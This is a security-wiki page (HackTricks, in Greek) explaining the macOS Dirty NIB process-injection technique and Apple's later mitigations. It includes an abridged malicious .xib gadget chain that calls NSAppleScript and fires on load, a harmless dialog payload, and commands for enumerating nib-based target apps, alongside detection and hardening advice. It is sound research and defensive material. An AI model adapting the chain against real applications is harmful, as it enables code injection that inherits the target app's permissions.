# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Το Dirty NIB αναφέρεται στην κατάχρηση αρχείων Interface Builder (.xib/.nib) μέσα σε ένα signed macOS app bundle, ώστε να εκτελεστεί logic που ελέγχεται από τον attacker μέσα στη διεργασία-στόχο, κληρονομώντας έτσι τα entitlements και τα TCC permissions της. Η τεχνική τεκμηριώθηκε αρχικά από τον xpn (MDSec) και αργότερα γενικεύτηκε και επεκτάθηκε σημαντικά από τη Sector7, η οποία κάλυψε επίσης τα mitigations της Apple στα macOS 13 Ventura και macOS 14 Sonoma.<sup>[1][2]</sup> Για background και deep dives, δείτε τις references στο τέλος.

> TL;DR
> • Πριν από το macOS 13 Ventura: η αντικατάσταση του MainMenu.nib ενός bundle (ή ενός άλλου nib που φορτώνεται κατά την εκκίνηση) μπορούσε αξιόπιστα να επιτύχει process injection και συχνά privilege escalation.
> • Από το macOS 13 (Ventura) και με τις βελτιώσεις του macOS 14 (Sonoma): το first-launch deep verification, η bundle protection, τα Launch Constraints και το νέο TCC “App Management” permission αποτρέπουν σε μεγάλο βαθμό το post-launch nib tampering από άσχετες εφαρμογές. Οι επιθέσεις μπορεί να παραμένουν εφικτές σε ειδικές περιπτώσεις (π.χ. tooling του ίδιου developer που τροποποιεί τις δικές του εφαρμογές ή terminals στα οποία ο χρήστης έχει παραχωρήσει App Management/Full Disk Access).


## Τι είναι τα αρχεία NIB/XIB

Τα αρχεία Nib (σύντομο για NeXT Interface Builder) είναι serialized UI object graphs που χρησιμοποιούνται από AppKit apps. Το σύγχρονο Xcode αποθηκεύει editable XML .xib files, τα οποία γίνονται compile σε .nib κατά το build time. Μια τυπική εφαρμογή φορτώνει το main UI της μέσω του `NSApplicationMain()`, το οποίο διαβάζει το `NSMainNibFile` key από το Info.plist της εφαρμογής και κάνει instantiate το object graph κατά το runtime.

Βασικά σημεία που επιτρέπουν την επίθεση:
- Το NIB loading κάνει instantiate αυθαίρετες Objective‑C classes χωρίς να απαιτεί να συμμορφώνονται με το NSSecureCoding (ο nib loader της Apple χρησιμοποιεί fallback στα `init`/`initWithFrame:` όταν το `initWithCoder:` δεν είναι διαθέσιμο).
- Τα Cocoa Bindings μπορούν να χρησιμοποιηθούν καταχρηστικά για την κλήση methods κατά το instantiate των nibs, συμπεριλαμβανομένων chained calls που δεν απαιτούν user interaction.


## Διαδικασία Dirty NIB injection (οπτική του attacker)

Η κλασική ροή πριν από το Ventura:
1) Δημιουργία ενός malicious .xib
- Προσθέστε ένα `NSAppleScript` object (ή άλλες “gadget” classes, όπως το `NSTask`).
- Προσθέστε ένα `NSTextField` του οποίου ο τίτλος περιέχει το payload (π.χ. AppleScript ή command arguments).
- Προσθέστε ένα ή περισσότερα `NSMenuItem` objects, συνδεδεμένα μέσω bindings ώστε να καλούν methods στο target object.

2) Αυτόματο trigger χωρίς user clicks
- Χρησιμοποιήστε bindings για να ορίσετε το target/selector ενός menu item και, στη συνέχεια, καλέστε τη private μέθοδο `_corePerformAction`, ώστε η action να εκτελείται αυτόματα όταν φορτώνεται το nib. Έτσι καταργείται η ανάγκη ο χρήστης να κάνει click σε ένα button.

Minimal example μιας auto-trigger chain μέσα σε ένα .xib (abridged για λόγους σαφήνειας):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Αυτό επιτυγχάνει arbitrary AppleScript execution στη target process κατά το nib load.<sup>[1]</sup> Τα advanced chains μπορούν να:
- Κάνουν instantiate arbitrary AppKit classes (π.χ. `NSTask`) και να καλούν zero-argument methods όπως το `-launch`.
- Καλούν arbitrary selectors με object arguments μέσω του binding trick παραπάνω.
- Κάνουν load το AppleScriptObjC.framework για bridge σε Objective-C και ακόμη να καλούν επιλεγμένα C APIs.
- Σε παλαιότερα συστήματα που εξακολουθούν να περιλαμβάνουν το Python.framework, να κάνουν bridge σε Python και έπειτα να χρησιμοποιούν `ctypes` για να καλούν arbitrary C functions (έρευνα της Sector7).<sup>[2]</sup>

3) Αντικατάσταση του nib της εφαρμογής
- Αντιγράψτε το target.app σε writable location, αντικαταστήστε π.χ. το `Contents/Resources/MainMenu.nib` με το malicious nib και εκτελέστε το target.app. Πριν από το Ventura, μετά από ένα one-time Gatekeeper assessment, τα subsequent launches εκτελούσαν μόνο shallow signature checks, επομένως τα non-executable resources (όπως τα .nib) δεν υποβάλλονταν ξανά σε validation.

Παράδειγμα AppleScript payload για visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Σύγχρονες προστασίες του macOS (Ventura/Monterey/Sonoma/Sequoia)

Η Apple εισήγαγε αρκετές συστημικές mitigations που μειώνουν δραματικά τη βιωσιμότητα του Dirty NIB στο σύγχρονο macOS:<sup>[2]</sup>
- Επαλήθευση σε βάθος κατά την πρώτη εκκίνηση και προστασία bundle (macOS 13 Ventura)
- Κατά την πρώτη εκτέλεση οποιασδήποτε εφαρμογής (σε καραντίνα ή όχι), ένας βαθύς έλεγχος υπογραφής καλύπτει όλους τους πόρους του bundle. Στη συνέχεια, το bundle προστατεύεται: μόνο εφαρμογές από τον ίδιο developer (ή εφαρμογές που επιτρέπονται ρητά από την ίδια την εφαρμογή) μπορούν να τροποποιήσουν τα περιεχόμενά του. Για την εγγραφή στο bundle μιας άλλης εφαρμογής, οι υπόλοιπες εφαρμογές χρειάζονται τη νέα άδεια TCC “App Management”.
- Launch Constraints (macOS 13 Ventura)
- Οι εφαρμογές που περιλαμβάνονται στο System/Apple δεν μπορούν να αντιγραφούν αλλού και να εκτελεστούν· αυτό εξουδετερώνει την προσέγγιση “αντιγραφή στο /tmp, patch, εκτέλεση” για τις εφαρμογές του OS.
- Βελτιώσεις στο macOS 14 Sonoma
- Η Apple ενίσχυσε το App Management και διόρθωσε γνωστά bypasses (π.χ. το CVE‑2023‑40450) που επισημάνθηκαν από τη Sector7. Το Python.framework είχε αφαιρεθεί νωρίτερα (macOS 12.3), διακόπτοντας ορισμένες αλυσίδες privilege-escalation.
- Αλλαγές στο Gatekeeper/Quarantine
- Για μια ευρύτερη συζήτηση σχετικά με το Gatekeeper, την προέλευση και τις αλλαγές αξιολόγησης που επηρέασαν αυτή την τεχνική, δείτε τη σελίδα που αναφέρεται παρακάτω.

> Πρακτική συνέπεια
> • Στο Ventura+ γενικά δεν μπορείτε να τροποποιήσετε το .nib μιας εφαρμογής τρίτου μέρους, εκτός αν η διεργασία σας διαθέτει App Management ή είναι signed με το ίδιο Team ID με τον στόχο (π.χ. developer tooling).
> • Η παραχώρηση App Management ή Full Disk Access σε shells/terminals ουσιαστικά ανοίγει ξανά αυτή την attack surface για οτιδήποτε μπορεί να εκτελέσει code μέσα στο context αυτού του terminal.


### Αντιμετώπιση των Launch Constraints

Τα Launch Constraints εμποδίζουν την εκτέλεση πολλών εφαρμογών της Apple από μη προεπιλεγμένες τοποθεσίες, αρχής γενομένης από το Ventura. Αν βασιζόσασταν σε workflows πριν από το Ventura, όπως η αντιγραφή μιας εφαρμογής της Apple σε έναν προσωρινό κατάλογο, η τροποποίηση του `MainMenu.nib` και η εκτέλεσή της, αναμένετε ότι αυτό θα αποτυγχάνει σε >= 13.0.


## Enumeration targets και nibs (χρήσιμο για research / legacy systems)

- Εντοπίστε εφαρμογές των οποίων το UI βασίζεται σε nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Εντοπίστε υποψήφιους πόρους nib μέσα σε ένα bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Επικύρωσε σε βάθος τις υπογραφές κώδικα (θα αποτύχει αν έχεις παραποιήσει τους πόρους και δεν έχεις κάνει re-sign):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Σημείωση: Σε σύγχρονα macOS θα αποκλειστείτε επίσης από την προστασία bundle/TCC όταν προσπαθείτε να γράψετε στο bundle μιας άλλης εφαρμογής χωρίς την κατάλληλη εξουσιοδότηση.


## Συμβουλές για Detection και DFIR

- Παρακολούθηση ακεραιότητας αρχείων στους πόρους του bundle
- Παρακολουθήστε αλλαγές mtime/ctime στα `Contents/Resources/*.nib` και σε άλλους μη εκτελέσιμους πόρους εγκατεστημένων εφαρμογών.
- Unified logs και συμπεριφορά διεργασιών
- Παρακολουθήστε για μη αναμενόμενη εκτέλεση AppleScript μέσα σε GUI εφαρμογές και για διεργασίες που φορτώνουν AppleScriptObjC ή Python.framework. Παράδειγμα:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Εκτελείτε περιοδικά `codesign --verify --deep` σε κρίσιμες εφαρμογές, ώστε να διασφαλίζετε ότι οι πόροι παραμένουν ανέπαφοι.
- Πλαίσιο προνομίων
- Ελέγξτε ποιος/τι έχει TCC “App Management” ή Full Disk Access (ιδιαίτερα τα terminals και τους management agents). Η αφαίρεση αυτών των δικαιωμάτων από shells γενικού σκοπού αποτρέπει την εύκολη επανενεργοποίηση tampering τύπου Dirty NIB.


## Defensive hardening (developers και defenders)

- Προτιμήστε programmatic UI ή περιορίστε ό,τι γίνεται instantiate από nibs. Αποφύγετε τη συμπερίληψη ισχυρών classes (π.χ. `NSTask`) σε nib graphs και αποφύγετε bindings που καλούν έμμεσα selectors σε αυθαίρετα objects.
- Υιοθετήστε το hardened runtime με Library Validation (ήδη αποτελεί πρότυπο για σύγχρονες εφαρμογές). Αν και αυτό δεν σταματά από μόνο του το nib injection, εμποδίζει την εύκολη φόρτωση native code και αναγκάζει τους attackers να περιοριστούν σε scripting-only payloads.
- Μην ζητάτε ούτε να εξαρτάστε από ευρέα App Management permissions σε general-purpose tools. Αν το MDM απαιτεί App Management, διαχωρίστε αυτό το context από user-driven shells.
- Επαληθεύετε τακτικά την ακεραιότητα του app bundle σας και κάντε τους μηχανισμούς update σας self-heal τους πόρους του bundle.


## Σχετική ανάγνωση στο HackTricks

Μάθετε περισσότερα σχετικά με το Gatekeeper, το quarantine και τις αλλαγές provenance που επηρεάζουν αυτήν την τεχνική:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Αναφορές

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
